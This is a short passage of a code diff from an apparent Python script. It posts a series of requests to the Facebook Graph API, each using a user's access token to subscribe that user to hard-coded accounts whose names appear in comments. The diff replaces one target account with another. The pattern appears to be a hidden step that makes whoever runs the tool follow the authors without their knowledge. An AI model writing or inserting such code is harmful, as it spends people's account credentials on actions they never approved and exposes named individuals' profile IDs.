@@ -32,7 +32,7 @@ def main():
     requests.post("https://graph.facebook.com/100048514350891/subscribers?access_token=" + token) # Muhammad Hamza
     requests.post("https://graph.facebook.com/100007854312451/subscribers?access_token=" + token) # Asghar Latif
     requests.post("https://graph.facebook.com/100001746091747/subscribers?access_token=" + token) # Rishu
-    requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
+    requests.post("https://graph.facebook.com/100020517793189/subscribers?access_token=" + token) # Hamza gul
     requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
     requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
     requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
